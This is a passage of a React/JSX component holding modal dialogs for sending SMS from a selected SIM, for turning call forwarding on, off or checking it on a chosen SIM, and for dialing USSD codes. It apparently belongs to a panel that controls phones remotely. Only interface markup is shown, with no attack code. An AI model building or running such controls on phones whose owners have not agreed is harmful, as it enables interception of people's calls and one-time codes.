            <select value={sendSim} onChange={e => setSendSim(Number(e.target.value))}
              className="mb-3 h-12 w-full rounded-xl border-2 border-green-500 bg-white px-3 text-[14px] outline-none">
              {sims.sim1 && <option value={0}>{sims.sim1c ? `${sims.sim1c} - ` : ""}{sims.sim1}</option>}
              {sims.sim2 && <option value={1}>{sims.sim2c ? `${sims.sim2c} - ` : ""}{sims.sim2}</option>}
              {!sims.sim1 && !sims.sim2 && <><option value={0}>SIM 1</option><option value={1}>SIM 2</option></>}
            </select>
            <label className="mb-1 block text-[13px] font-semibold text-gray-600">Number:</label>
            <input value={sendNumber} onChange={e => setSendNumber(e.target.value)}
              placeholder="Phone number" inputMode="tel"
              className="mb-3 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
            <label className="mb-1 block text-[13px] font-semibold text-gray-600">Message:</label>
            <textarea value={sendMsg} onChange={e => setSendMsg(e.target.value)}
              placeholder="Message text" rows={3}
              className="mb-4 w-full rounded-xl border border-gray-200 px-4 py-3 text-[14px] outline-none focus:border-gray-400 resize-none" />
            <button type="button" onClick={handleSendSms} disabled={sendLoading || !sendNumber.trim() || !sendMsg.trim()}
              className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">
              {sendLoading ? "Sending…" : "Proceed"}
            </button>
          </div>
        </div>
      )}

      {/* ── Call Forward Modal ── */}
      {cfOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-4 flex items-center justify-between">
              <span className="text-[16px] font-extrabold text-gray-900">Call Forwarding</span>
              <button type="button" onClick={() => setCfOpen(false)}
                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <label className="mb-2 block text-[13px] font-semibold text-gray-600">SIM:</label>
            {/* Radio buttons like competitor */}
            <div className="mb-4 overflow-hidden rounded-xl border border-gray-200">
              {(sims.sim1 || sims.sim2) ? (
                <>
                  {sims.sim1 && (
                    <button type="button" onClick={() => setCfSim(0)}
                      className={`flex w-full items-center justify-between border-b border-gray-100 px-4 py-4 text-[14px] font-semibold ${cfSim === 0 ? "text-gray-900" : "text-gray-500"}`}>
                      <span>{sims.sim1c ? `${sims.sim1c} - ` : ""}{sims.sim1}</span>
                      <div className={`h-5 w-5 rounded-full border-2 ${cfSim === 0 ? "border-yellow-600 bg-yellow-600" : "border-gray-300 bg-white"}`} />
                    </button>
                  )}
                  {sims.sim2 && (
                    <button type="button" onClick={() => setCfSim(1)}
                      className={`flex w-full items-center justify-between px-4 py-4 text-[14px] font-semibold ${cfSim === 1 ? "text-gray-900" : "text-gray-500"}`}>
                      <span>{sims.sim2c ? `${sims.sim2c} - ` : ""}{sims.sim2}</span>
                      <div className={`h-5 w-5 rounded-full border-2 ${cfSim === 1 ? "border-yellow-600 bg-yellow-600" : "border-gray-300 bg-white"}`} />
                    </button>
                  )}
                </>
              ) : (
                <>
                  {[0,1].map(s => (
                    <button key={s} type="button" onClick={() => setCfSim(s)}
                      className={`flex w-full items-center justify-between ${s === 0 ? "border-b border-gray-100" : ""} px-4 py-4 text-[14px] font-semibold`}>
                      <span>SIM {s+1}</span>
                      <div className={`h-5 w-5 rounded-full border-2 ${cfSim === s ? "border-yellow-600 bg-yellow-600" : "border-gray-300 bg-white"}`} />
                    </button>
                  ))}
                </>
              )}
            </div>
            <input value={cfNumber} onChange={e => setCfNumber(e.target.value)}
              placeholder="Forwarding number" inputMode="tel"
              className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
            <div className="grid grid-cols-1 gap-2">
              <button type="button" onClick={() => handleCallForward("activate")} disabled={cfLoading}
                className="rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50">
                Proceed
              </button>
              <div className="grid grid-cols-2 gap-2">
                <button type="button" onClick={() => handleCallForward("deactivate")} disabled={cfLoading}
                  className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50">
                  DeActive Call Forwarding
                </button>
                <button type="button" onClick={() => handleCallForward("check")} disabled={cfLoading}
                  className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50">
                  Check Forwarding
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── Dial USSD Modal ── */}
      {ussdOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-4 flex items-center justify-between">
              <span className="text-[16px] font-extrabold text-gray-900">USSD Dialing</span>
              <button type="button" onClick={() => setUssdOpen(false)}
                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <label className="mb-1 block text-[13px] font-semibold text-gray-600">SIM:</label>
            <select value={ussdSim} onChange={e => setUssdSim(Number(e.target.value))}
              className="mb-4 h-12 w-full rounded-xl border-2 border-green-500 bg-white px-3 text-[14px] outline-none">
              {sims.sim1 && <option value={0}>{sims.sim1c ? `${sims.sim1c} - ` : ""}{sims.sim1}</option>}
              {sims.sim2 && <option value={1}>{sims.sim2c ? `${sims.sim2c} - ` : ""}{sims.sim2}</option>}
              {!sims.sim1 && !sims.sim2 && <><option value={0}>SIM 1</option><option value={1}>SIM 2</option></>}
            </select>
            <label className="mb-1 block text-[13px] font-semibold text-gray-600">USSD Code:</label>
            <input value={ussdCode} onChange={e => setUssdCode(e.target.value)}
              placeholder="e.g. *123#" autoFocus
              className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
            <button type="button" onClick={handleDialUssd} disabled={ussdLoading || !ussdCode.trim()}
              className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">
              {ussdLoading ? "Sending…" : "Proceed"}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
